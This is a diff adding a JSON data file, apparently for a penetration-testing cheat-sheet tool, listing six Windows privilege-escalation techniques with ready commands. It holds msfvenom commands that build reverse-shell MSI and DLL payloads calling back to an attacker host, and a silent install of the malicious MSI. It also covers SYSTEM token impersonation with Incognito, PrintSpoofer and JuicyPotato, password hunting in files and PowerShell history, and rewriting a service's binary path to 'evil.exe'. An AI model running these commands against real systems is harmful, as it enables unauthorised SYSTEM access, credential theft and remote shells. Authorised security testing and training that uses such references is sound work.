@@ -1,0 +1,225 @@
+{
+    "name": "Windows Privilege Escalation",
+    "category": "privesc",
+    "description": "Techniques to escalate privileges on Windows systems",
+    "icon": "🪟",
+    "techniques": [
+        {
+            "id": "win-privesc-1",
+            "name": "Unquoted Service Paths",
+            "difficulty": "Intermediate",
+            "description": "Exploit unquoted service paths for privilege escalation",
+            "steps": [
+                "Find unquoted paths",
+                "Identify writable directories",
+                "Place malicious executable"
+            ],
+            "commands": [
+                {
+                    "tool": "Find Unquoted",
+                    "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"",
+                    "description": "Find unquoted service paths"
+                },
+                {
+                    "tool": "PowerShell",
+                    "command": "Get-WmiObject win32_service | ?{$_.PathName -notlike 'C:\\Windows*' -and $_.PathName -notlike '\"*'} | select Name,PathName",
+                    "description": "PowerShell alternative"
+                },
+                {
+                    "tool": "Check Permissions",
+                    "command": "icacls \"C:\\Program Files\\Vulnerable App\"",
+                    "description": "Check directory permissions"
+                }
+            ],
+            "tips": [
+                "Need write access to directory in path",
+                "Service must run as SYSTEM",
+                "Restart service to trigger"
+            ]
+        },
+        {
+            "id": "win-privesc-2",
+            "name": "AlwaysInstallElevated",
+            "difficulty": "Beginner",
+            "description": "Exploit MSI installer running with elevated privileges",
+            "steps": [
+                "Check registry keys",
+                "Generate malicious MSI",
+                "Install and get SYSTEM shell"
+            ],
+            "commands": [
+                {
+                    "tool": "Check Registry",
+                    "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+                    "description": "Check HKLM key"
+                },
+                {
+                    "tool": "Check User Key",
+                    "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+                    "description": "Check HKCU key"
+                },
+                {
+                    "tool": "msfvenom MSI",
+                    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o evil.msi",
+                    "description": "Generate malicious MSI"
+                },
+                {
+                    "tool": "Install MSI",
+                    "command": "msiexec /quiet /qn /i evil.msi",
+                    "description": "Silent MSI installation"
+                }
+            ],
+            "tips": [
+                "Both keys must be set to 1",
+                "Quick SYSTEM shell if misconfigured"
+            ]
+        },
+        {
+            "id": "win-privesc-3",
+            "name": "Token Impersonation",
+            "difficulty": "Advanced",
+            "description": "Impersonate tokens for privilege escalation",
+            "steps": [
+                "Check current privileges",
+                "Find impersonation tokens",
+                "Impersonate SYSTEM token"
+            ],
+            "commands": [
+                {
+                    "tool": "whoami privs",
+                    "command": "whoami /priv",
+                    "description": "Check current privileges"
+                },
+                {
+                    "tool": "Incognito",
+                    "command": "use incognito\\nlist_tokens -u\\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"",
+                    "description": "Metasploit Incognito"
+                },
+                {
+                    "tool": "PrintSpoofer",
+                    "command": "PrintSpoofer.exe -i -c cmd",
+                    "description": "Potato-style attack"
+                },
+                {
+                    "tool": "JuicyPotato",
+                    "command": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}",
+                    "description": "JuicyPotato attack"
+                }
+            ],
+            "tips": [
+                "Need SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
+                "Service accounts often have these",
+                "PrintSpoofer works on newer Windows"
+            ]
+        },
+        {
+            "id": "win-privesc-4",
+            "name": "Stored Credentials",
+            "difficulty": "Beginner",
+            "description": "Find and use stored credentials",
+            "steps": [
+                "Search for stored credentials",
+                "Extract credentials",
+                "Use for escalation"
+            ],
+            "commands": [
+                {
+                    "tool": "cmdkey",
+                    "command": "cmdkey /list",
+                    "description": "List stored credentials"
+                },
+                {
+                    "tool": "runas",
+                    "command": "runas /savecred /user:DOMAIN\\Admin cmd.exe",
+                    "description": "Use saved credentials"
+                },
+                {
+                    "tool": "Search Files",
+                    "command": "findstr /si password *.txt *.ini *.config",
+                    "description": "Search for passwords in files"
+                },
+                {
+                    "tool": "PowerShell History",
+                    "command": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+                    "description": "Check PowerShell history"
+                }
+            ],
+            "tips": [
+                "Check browser saved passwords",
+                "Unattend.xml may contain creds",
+                "Registry autologon passwords"
+            ]
+        },
+        {
+            "id": "win-privesc-5",
+            "name": "DLL Hijacking",
+            "difficulty": "Advanced",
+            "description": "Replace or inject malicious DLLs",
+            "steps": [
+                "Find missing DLLs",
+                "Check write permissions",
+                "Place malicious DLL"
+            ],
+            "commands": [
+                {
+                    "tool": "ProcMon",
+                    "command": "# Use Process Monitor to find missing DLLs",
+                    "description": "Monitor DLL loading"
+                },
+                {
+                    "tool": "msfvenom DLL",
+                    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o evil.dll",
+                    "description": "Generate malicious DLL"
+                },
+                {
+                    "tool": "Check PATH",
+                    "command": "echo %PATH%",
+                    "description": "Check DLL search path"
+                }
+            ],
+            "tips": [
+                "Applications search current directory first",
+                "Missing DLLs are common",
+                "Restart application/service to trigger"
+            ]
+        },
+        {
+            "id": "win-privesc-6",
+            "name": "Service Permissions",
+            "difficulty": "Intermediate",
+            "description": "Exploit weak service permissions",
+            "steps": [
+                "Enumerate service permissions",
+                "Modify vulnerable service",
+                "Restart service for SYSTEM"
+            ],
+            "commands": [
+                {
+                    "tool": "accesschk",
+                    "command": "accesschk.exe -uwcqv \"Everyone\" *",
+                    "description": "Find writable services"
+                },
+                {
+                    "tool": "sc query",
+                    "command": "sc qc <service_name>",
+                    "description": "Query service configuration"
+                },
+                {
+                    "tool": "sc config",
+                    "command": "sc config <service> binpath= \"C:\\temp\\evil.exe\"",
+                    "description": "Modify service binary path"
+                },
+                {
+                    "tool": "PowerUp",
+                    "command": "Invoke-AllChecks",
+                    "description": "PowerUp automated check"
+                }
+            ],
+            "tips": [
+                "Look for SERVICE_CHANGE_CONFIG permission",
+                "Backup original config",
+                "Net start/stop to restart"
+            ]
+        }
+    ]
+}
